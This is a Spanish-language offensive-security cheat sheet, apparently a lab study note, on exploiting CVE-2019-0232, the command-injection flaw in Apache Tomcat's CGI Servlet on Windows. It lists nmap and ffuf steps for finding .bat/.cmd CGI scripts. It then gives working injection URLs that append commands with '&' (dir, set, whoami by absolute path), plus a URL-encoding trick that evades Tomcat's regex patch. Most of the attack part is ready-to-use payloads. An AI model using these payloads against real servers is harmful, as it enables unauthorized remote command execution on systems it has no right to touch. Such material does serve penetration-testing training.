---
tags:
  - webapp
  - tomcatCGI
  - attack
  - CVE-2019-0232
---
## Conceptos Clave (TL;DR)

* Es una vulnerabilidad crítica de Ejecución Remota de Comandos (RCE) por inyección de comandos en el CGI Servlet de Apache Tomcat.
* Afecta a sistemas Windows que tienen habilitada la configuración `enableCmdLineArguments`.
* Ocurre porque el CGI Servlet no valida correctamente el input del navegador web antes de pasarlo al script CGI, permitiendo concatenar comandos del sistema operativo usando el separador `&`.
* Versiones afectadas de Tomcat: 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39, y 7.0.0 a 7.0.93.

## Herramientas Clave

* **Nmap**: Utilizado para enumeración de puertos, descubrimiento de servicios y confirmación de la versión de Apache Tomcat ejecutándose en el objetivo.
* **ffuf**: Utilizado para web fuzzing y descubrimiento de directorios/archivos ocultos, específicamente para localizar scripts CGI válidos (.bat o .cmd).

## Metodología Paso a Paso

### 1. Enumeración Inicial
El primer paso es escanear el objetivo para identificar puertos abiertos y servicios. Buscamos específicamente el servicio de Tomcat (usualmente en el puerto 8080) para confirmar si la versión en ejecución es vulnerable a CVE-2019-0232.

### 2. Descubrimiento de Scripts (Fuzzing)
Una vez identificado Tomcat, necesitamos encontrar un script CGI válido que podamos explotar. Por defecto, los scripts CGI suelen residir en el directorio `/cgi`. Al estar frente a un entorno Windows, el objetivo es enumerar archivos con extensiones `.bat` o `.cmd`.

### 3. Explotación y Ejecución de Comandos
Habiendo localizado un script válido (por ejemplo, `welcome.bat`), se procede a inyectar comandos. Se utiliza el carácter `&` seguido del comando arbitrario directamente en la URL. Si los comandos básicos fallan, se requiere investigar el entorno (por ejemplo, leyendo las variables de entorno) para adaptar el payload.

## Cheat Sheet de Comandos
### Nmap - Escaneo de Puertos
```bash
# Escanea todos los puertos (-p-), ejecuta scripts por defecto (-sC), omite ping (-Pn) y muestra solo puertos abiertos (--open)

nmap -p- -sC -Pn <TARGET_IP> --open
```
### Ffuf - Descubrimiento de Scripts CGI
```bash
# Fuzzing buscando scripts con extensión .cmd en el directorio /cgi de Tomcat usando una wordlist
ffuf -w <WORDLIST_PATH> -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.cmd

  
# Fuzzing buscando scripts con extensión .bat en el directorio /cgi de Tomcat usando una wordlist
ffuf -w <WORDLIST_PATH> -u http://<TARGET_IP>:<PORT>/cgi/FUZZ.bat
```
### Explotación CGI - Inyección Básica
```http
# Inyecta el comando 'dir' concatenándolo con '&' al final de la URL del script
http://<TARGET_IP>:<PORT>/cgi/<SCRIPT_NAME>.bat?&dir

  
# Inyecta el comando 'set' para enumerar todas las variables de entorno del sistema
http://<TARGET_IP>:<PORT>/cgi/<SCRIPT_NAME>.bat?&set
```
### Explotación CGI - Rutas Absolutas (RCE)
```http
# Ejecuta whoami usando su ruta absoluta en caso de que la variable PATH esté vacía o no configurada

http://<TARGET_IP>:<PORT>/cgi/<SCRIPT_NAME>.bat?&c:\windows\system32\whoami.exe
```
### Explotación CGI - Bypass de Filtro Regex (URL-Encoding)
```http
# Ejecuta el mismo comando whoami por ruta absoluta, pero aplicando URL-encoding a los caracteres especiales (: y \) para evadir filtros de Tomcat

http://<TARGET_IP>:<PORT>/cgi/<SCRIPT_NAME>.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

## "Gotchas" y Troubleshooting

* **Pre-requisito Estricto:** La vulnerabilidad requiere que el sistema subyacente sea Windows y que la opción `enableCmdLineArguments` esté en `true`.

* **Fallo de Comandos Comunes (PATH unset):** Es muy probable que la variable de entorno `PATH` esté desconfigurada ("unset"). Si comandos como `whoami` no devuelven output, debes llamar a los binarios utilizando su ruta absoluta (ej. `c:\windows\system32\whoami.exe`).

* **Bypass de Filtros (Invalid Character Error):** En un intento de mitigar esta técnica, Apache Tomcat introdujo un parche con un filtro regex para bloquear caracteres especiales. Si recibes un error indicando un "invalid character", puedes hacer bypass fácilmente aplicando URL-encoding a tu payload (ej. `%3A` en lugar de `:` y `%5C` en lugar de `\`).